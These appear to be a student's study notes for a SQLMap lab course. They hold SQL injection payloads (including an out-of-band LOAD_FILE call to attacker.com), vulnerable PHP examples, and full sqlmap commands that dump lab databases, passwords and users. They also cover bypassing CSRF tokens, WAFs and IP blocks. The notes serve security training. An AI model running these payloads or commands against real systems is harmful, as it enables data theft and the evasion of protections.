## Getting Started
#### SQLMap Overview
```
## Supported SQL Injection Types
areaeric@htb[/htb]$ sqlmap -hh

- Boolean-based blind SQL Injection
AND 1=1

- Error-based SQL Injection
AND GTID_SUBSET(@@version,0)

- UNION query-based
UNION ALL SELECT 1,@@version,3

- Stakced queries
; DROP TABLE users

- Time-based blind SQL Injection
AND 1=IF(2>1,SLEEP(5),0)

- Inline queries
SELECT (SELECT @@version) from

- Out-of-band SQL Injection
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))

## Question 
Union query-based
```

#### Getting Started with SQLMap
```shell-session
## Help menu
areaeric@htb[/htb]$ sqlmap -h

areaeric@htb[/htb]$ sqlmap -hh

## Basic Scenario
- Vulnerable PHP code example:
$link = mysqli_connect($host, $username, $password, $database, 3306);
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
$result = mysqli_query($link, $sql);
if (!$result)
    die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");

areaeric@htb[/htb]$ sqlmap -u "http://www.example.com/vuln.php?id=1" --batch

Note: in this case, option '-u' is used to provide the target URL, while the switch '--batch' is used for skipping any required user-input, by automatically choosing using the default option.
```

#### SQLMap Output Description
```
## Log Message Description

- URL content is statble:
	-> "target URL content is stable"

- Parameter appears to be dynamic
	-> "GET parameter 'id' appears to be dynamic"

- Parameter might be injectable
	-> "heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')"

- Parameter might be vulnerable to XSS attacks
	-> "heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"

- Back-end DBMS is '...'
	-> "it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]"

- Level/risk values
	-> "for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]"

- Reflective values found 
	-> "reflective value(s) found and filtering out"

- Parameters appears to be injectable
	-> "GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")"

- Time-based comparison statistical model 
	-> "time-based comparison requires a larger statistical model, please wait........... (done)"

- Extending UNION query injection technique tests
	-> "automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found"

- Technique appears to be usable
	-> "ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test"
	
	Note that this depends on the affected table in the vulnerable query.\

- Parameter is vulnerable
	-> "GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]"

- Sqlmap identified injection points
	-> "sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:"

- Data logged to text files
	-> "fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'"
```

## Building Attacks
#### Running SQLMap on HTTP Request
```
## Curl Commands
- Go to network tab, copy as cURL
- Change curl response to sqlmap:
areaeric@htb[/htb]$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'

## GET/POST Requests
areaeric@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'

areaeric@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'

## Full HTTP Requests
- Copying whole request (e.g. from burp) into a file
- E.g. Request file
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947"
Cache-Control: max-age=0

Tip: similarly to the case with the '--data' option, within the saved request file, we can specify the parameter we want to inject in with an asterisk (*), such as '/?id=*'.

## Custom SQLMap Requests
- Fine tunning cookies:
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
or
areaeric@htb[/htb]$ sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

- Custom HTTP method
areaeric@htb[/htb]$ sqlmap -u www.target.com --data='id=1' --method PUT

## Custom HTTP Requests
areaeric@htb[/htb]$ cat req.txt
HTTP / HTTP/1.0
Host: www.example.com

{
  "data": [{
    "type": "articles",
    "id": "1",
    "attributes": {
      "title": "Example JSON",
      "body": "Just an example",
      "created": "2020-05-22T14:56:29.000Z",
      "updated": "2020-05-22T14:56:28.000Z"
    },
    "relationships": {
      "author": {
        "data": {"id": "42", "type": "user"}
      }
    }
  }]
}

areaeric@htb[/htb]$ sqlmap -r req.txt

## Questions
Q1: What's the contents of table flag2? (Case #2)

- Performed SQLi detection ', vulnerable to sql injection:

- Used cURL SQL map injection method:
sqlmap 'http://94.237.63.83:33564/case2.php' --compressed -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://94.237.63.83:33564/case2.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://94.237.63.83:33564' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'id=1*' --batch --dump flag2

Q2: What's the contents of table flag3? (Case #3)

- Used cURL injection method:
sqlmap 'http://94.237.63.83:33564/case3.php' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://94.237.63.83:33564/case3.php' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: id=1*' -H 'Upgrade-Insecure-Requests: 1' --batch --dump flag3

Q3: What's the contents of table flag4? (Case #4)
- Create a file req4.txt
POST /case4.php HTTP/1.1                                      
Host: 94.237.63.83:33564                            
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*                                               
Accept-Language: en-US,en;q=0.5                           
Accept-Encoding: gzip, deflate                            
Referer: http://94.237.63.83:33564/case4.php              
Content-Type: application/json                            
Content-Length: 8                                              
Origin: http://94.237.63.83:33564                                 
DNT: 1                                                  
Connection: close   

sqlmap -r req4.txt --batch --dump flag4
```

#### Handling SQLMap Errors
```
## Display Errors
- use the switch --parse-errors
- E.g of error display:
...SNIP...
[16:09:20] [INFO] testing if GET parameter 'id' is dynamic
[16:09:20] [INFO] GET parameter 'id' appears to be dynamic
[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '))"',),)((' at line 1'"
[16:09:20] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''YzDZJELylInm' at line 1'
...SNIP...

## Store the traffic
- Store whole traffic in a output file:
areaeric@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt

- E.g. traffic file:
areaeric@htb[/htb]$ cat /tmp/traffic.txt
HTTP request [#1]:
GET /?id=1 HTTP/1.1
Host: www.example.com
Cache-control: no-cache
Accept-encoding: gzip,deflate
Accept: */*
User-agent: sqlmap/1.4.9 (http://sqlmap.org)
Connection: close

HTTP response [#1] (200 OK):
Date: Thu, 24 Sep 2020 14:12:50 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 914
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://www.example.com:80/?id=1

<!DOCTYPE html>
<html lang="en">

## Verbose Output
areaeric@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch

## Using Proxy
- Utilize the --proxy option to redirect traffic through a proxy (e.g. burp):
--proxy=http://127.0.0.1:8080 
```

####  Attack Tuning
```
## Prefix/Suffix
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"

- Example vulnerable query
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);

- Injection of vector: UNION ALL SELECT 1,2,VERSION()
	and prefix %')) with suffix -- -   results in:
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1

## Level/Risk
- Comparison of bounadaries
areaeric@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5

areaeric@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3

- Comparison of payloads
areaeric@htb[/htb]$ sqlmap -u www.example.com/?id=1

areaeric@htb[/htb]$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3

## Advanced Tuning
- Status Codes:
	-> use of --code
	-> E.g. --code=200 for detecting true responses for HTTP code 200

- Titiles:
	-> --titles for detecting changes in title

- Strings
	-> Some string value appearing in true respose
	-> E.g. --string=success

- Text-only
	-> Based comparison only on text-based content 
	-> -- text-only

- Techniques
	-> using specific technique as other techniques are not required or causing problem
	-> E.g. --technique=BEU

- Union SQLi Tuning
	-> If we know the exact column (though manual methods) of the table, we can use --union-cols (e.g. union-cols=17)

	-> If "dummy" filling values are not compatible, we can use an alternative value instead (e.g. --union-char='a')

	-> If there is a requirement to use an appendix in the form of FROM <table> (in the case of Oracle), it can be set with --union-form (e.g. --union-form=users)

## Exercises
- Reference on man page:
https://github.com/sqlmapproject/sqlmap/wiki/Usage

What's the contents of table flag5? (Case #5)

- Copy as cURL 
sqlmap 'http://83.136.253.251:58666/case5.php?id=1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://83.136.253.251:58666/case5.php' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1'

- Requires risk 3 OR, fine tune our command on technique and risk:
sqlmap 'http://83.136.253.251:58666/case5.php?id=1*' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://83.136.253.251:58666/case5.php' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --technique=B --risk=3 --batch --dump -T flag5

What's the contents of table flag6? (Case #6)
- Work flow injection of characters:
	` returned error.
- The thing with this question is col=id. col is the parameter being queries. So the underling would be something like
 query=... col ...
	-> col is likely to be a reserved charatcer:
- On more details of reserved character:
https://dba.stackexchange.com/questions/23129/benefits-of-using-backtick-in-mysql-queries

- Playing around with this parameter, we obtain: `) or true -- -
works
- We can try inject this character prefix: 
	-> Used --risk=3 as it seems to be vulnerable to or injection so not doing other techniques for now:

sqlmap 'http://83.136.255.150:32225/case6.php?col=id*' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://83.136.255.150:32225/case6.php' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --batch --prefix='`)' --dump -T flag6 --risk=3 --technique=B

	-> Without specifying the risk, it is much slower. Shows the importance of manually testing SQL injection for parameters we can directly test (especially get/post parameters):
	
- Also, we can do the following:
sqlmap 'http://83.136.255.150:32225/case6.php?col=id*' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://83.136.255.150:32225/case6.php' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --batch --prefix='`)' --dump -T flag6

What's the contents of table flag7? (Case #7)
- None of the SQLi injection quite worked.
- We use the reverse-engineer technique:
	- Notice the type for id, it is a number, so there is no '' or any other number escape. 
	- It usually gets queried at about the where statement:
		-  Select * from ... where id= '' 
	- If it is a string then we will need to escape accordingly.
	- So going with this logic:
	- we perform the union select finding column technique:
		-> final injection is id=1 union select 1,2,3,4,VERSION() -- -
		-> 5 column
	- With this, we can send sqlmap the command:
sqlmap 'http://94.237.63.83:33382/case7.php?id=1' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --dump --technique=U --batch --union-cols=5


or more simply, we can see that there is 5 columns and say --union-
cols=5: 
sqlmap 'http://94.237.63.83:33382/case7.php?id=1' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --technique=U --batch --union-cols=5 --dump -T flag7

-> Also be aware the use of --batch, it can be helpful or not depending on the situation

sqlmap 'http://94.237.63.83:33382/case7.php?id=1*' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --technique=U --batch --union-cols=5 --dump -T flag7
-> Couldn't find flag7

- Then we dump everything:
sqlmap 'http://94.237.63.83:33382/case7.php?id=1*' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --technique=U --batch --union-cols=5 --dump
-> The table is called testdb.flag7
```


## Database Enumeration
#### Database Enumeration
```
## SQLMap Data Exfilitration
- Queries.xml for MySQL DBMS
<?xml version="1.0" encoding="UTF-8"?>

<root>
    <dbms value="MySQL">
        <!-- http://dba.fyicenter.com/faq/mysql/Difference-between-CHAR-and-NCHAR.html -->
        <cast query="CAST(%s AS NCHAR)"/>
        <length query="CHAR_LENGTH(%s)"/>
        <isnull query="IFNULL(%s,' ')"/>
...SNIP...
        <banner query="VERSION()"/>
        <current_user query="CURRENT_USER()"/>
        <current_db query="DATABASE()"/>
        <hostname query="@@HOSTNAME"/>
        <table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/>
        <column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/>
        <is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/>
        <check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/>
        <users>
            <inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES" query2="SELECT user FROM mysql.user" query3="SELECT username FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
            <blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1" query2="SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1" query3="SELECT DISTINCT(username) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS LIMIT %d,1" count="SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES" count2="SELECT COUNT(DISTINCT(user)) FROM mysql.user" count3="SELECT COUNT(DISTINCT(username)) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
        </users>
    ...SNIP...

- To retrieive "banner", use VERSION() query, --current-user in SQLMAP
- To retrieive current user name, use CURRENT_USER() query, --current-user in SQLMAP

## Basic DB Data Enumeration
areaeric@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba

Note: The 'root' user in the database context in the vast majority of cases does not have any relation with the OS user "root", other than that representing the privileged user within the DBMS context. This basically means that the DB user should not have any constraints within the database context, while OS privileges (e.g. file system writing to arbitrary location) should be minimalistic, at least in the recent deployments. The same principle applies for the generic 'DBA' role.

## Table Enumeration
areaeric@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb

areaeric@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb

Tip: Apart from default CSV, we can specify the output format with the option `--dump-format` to HTML or SQLite, so that we can later further investigate the DB in an SQLite environment.

## Table/Row Enumeration
areaeric@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname

areaeric@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3

## Conditional Enumeration
areaeric@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"

## Full DB Enumeration
- use of --dump without specifing a table -T

## Questions

What's the contents of table flag1 in the testdb database? (Case #1)

- SQLi injection detection (as it is get/post/http parameter)
	-> Vulnerable (id is number, query reconstruction), payload: id=1 or 2=2 

- Basic DB Data Enumeration (on risk 3)
sqlmap 'http://94.237.63.83:33382/case1.php?id=1*' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --batch --risk=3 --banner --current-user --current-db --is-dba 

## Table Enumeration
sqlmap 'http://94.237.63.83:33382/case1.php?id=1*' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --batch --risk=3 -D testdb --tables

## Table/row enumeration
sqlmap 'http://94.237.63.83:33382/case1.php?id=1*' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --batch --risk=3 -D testdb --dump -T flag1
```

#### Advanced Database Enumeration
```
## DB Schema Enumeration
areaeric@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --schema

## Searching for Data
areaeric@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -T user

areaeric@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -C pass

## Password Enumeration and Cracking
areaeric@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users

## DB Users Password Enumeration and Cracking
areaeric@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch

Tip: The '--all' switch in combination with the '--batch' switch, will automa(g)ically do the whole enumeration process on the target itself, and provide the entire enumeration details.

## Questions
What's the name of the column containing "style" in it's name? (Case #1)?

- Searching for Data
sqlmap 'http://94.237.63.83:33382/case1.php?id=1*' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --batch --risk=3 --search -C style

What's the Kimberly user's password? (Case #1)?
- Search for data
sqlmap 'http://94.237.63.83:33382/case1.php?id=1*' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --batch --risk=3 --search -C password
-> Database:testdb, Table:users

- Dumping table
sqlmap 'http://94.237.63.83:33382/case1.php?id=1*' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --batch --risk=3 --dump -D testdb -T users

- Fine tuning the dump (only display username and password)
sqlmap 'http://94.237.63.83:33382/case1.php?id=1*' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --batch --risk=3 --dump -D testdb -T users -C name,password

- Further fine tunning:
sqlmap 'http://94.237.63.83:33382/case1.php?id=1*' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --batch --risk=3 --dump -D testdb -T users -C name,password --where="name LIKE 'Kimberly%'"
```

## Advanced SQLMap Usage
#### Bypassing Web Application Protections
```
## Anti-CSRF Token Bypasses
- Used for `csrf`, `xsrf`, `token`
areaeric@htb[/htb]$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"

## Unique Value Bypass
areaeric@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI

## Calculated Parameter Bypass
areaeric@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI

## IP Address Concealing
e.g.L --proxy="socks4://177.39.187.70:33283

## WAF Bypasses
--skip-waf

## User-agent Blacklisting Bypass
--random-agent

Note: If some form of protection is detected during the run, we can expect problems with the target, even other security mechanisms. The main reason is the continuous development and new improvements in such protections, leaving smaller and smaller maneuver space for attackers.

## Tamper Scripts
e.g. --tamper=between,randomcase
- More show-cased below:
```

| **Tamper-Script**           | **Description**                                                                                                                  |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| `0eunion`                   | Replaces instances of UNION with e0UNION                                                                                         |
| `base64encode`              | Base64-encodes all characters in a given payload                                                                                 |
| `between`                   | Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`                 |
| `commalesslimit`            | Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart                                                 |
| `equaltolike`               | Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart                                                         |
| `halfversionedmorekeywords` | Adds (MySQL) versioned comment before each keyword                                                                               |
| `modsecurityversioned`      | Embraces complete query with (MySQL) versioned comment                                                                           |
| `modsecurityzeroversioned`  | Embraces complete query with (MySQL) zero-versioned comment                                                                      |
| `percentage`                | Adds a percentage sign (`%`) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)                                            |
| `plus2concat`               | Replaces plus operator (`+`) with (MsSQL) function CONCAT() counterpart                                                          |
| `randomcase`                | Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)                                                   |
| `space2comment`             | Replaces space character ( ) with comments `/                                                                                    |
| `space2dash`                | Replaces space character ( ) with a dash comment (`--`) followed by a random string and a new line (`\n`)                        |
| `space2hash`                | Replaces (MySQL) instances of space character ( ) with a pound character (`#`) followed by a random string and a new line (`\n`) |
| `space2mssqlblank`          | Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters         |
| `space2plus`                | Replaces space character ( ) with plus (`+`)                                                                                     |
| `space2randomblank`         | Replaces space character ( ) with a random blank character from a valid set of alternate characters                              |
| `symboliclogical`           | Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `\|`)                                           |
| `versionedkeywords`         | Encloses each non-function keyword with (MySQL) versioned comment                                                                |
| `versionedmorekeywords`     | Encloses each keyword with (MySQL) versioned comment                                                                             |

```
## Miscellaneous Bypasses
--chunked

## Questions
What's the contents of table flag8? (Case #8)

- SQLi injection discovery-> Vulnerable to or injection.
	-> Payload used: 1 or '2'='2'

- Performing injection: Risk3, Skip WAF check, batch, dump flag8, bypass csrf-token protection:
sqlmap 'http://94.237.63.83:39055/case8.php' -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://94.237.63.83:39055/case8.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://94.237.63.83:39055' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=mfp2r8oce9bv56cfsic2deeiri' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'id=1*&t0ken=L8diEr9D3ZYoEgxvA8WCXfU04NwIEAXAAb8zTUUVxpI' --csrf-token="t0ken" --risk=3 --skip-waf --batch --dump -T flag8


What's the contents of table flag9? (Case #9)
- SQLi injection discovery-> Vulnerable to or injection.
	-> Payload used: 1 or '2'='2'

- Performing sqlmap injection: Risk3, Skip WAF check, batch, dump flag9, randomise value uid
sqlmap 'http://94.237.63.83:39055/case9.php?id=1*&uid=35455013083' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=mfp2r8oce9bv56cfsic2deeiri' -H 'Upgrade-Insecure-Requests: 1' --randomize=uid --risk=3 --skip-waf --batch --dump -T flag9

What's the contents of table flag10? (Case #10)
- SQLi injection discovery-> Vulnerable to or injection.
	-> Payload used: 1 or '2'='2'

- Performing sqlmap injection on random-agent, risk=3, , skip WAF check, batch, dump flag10
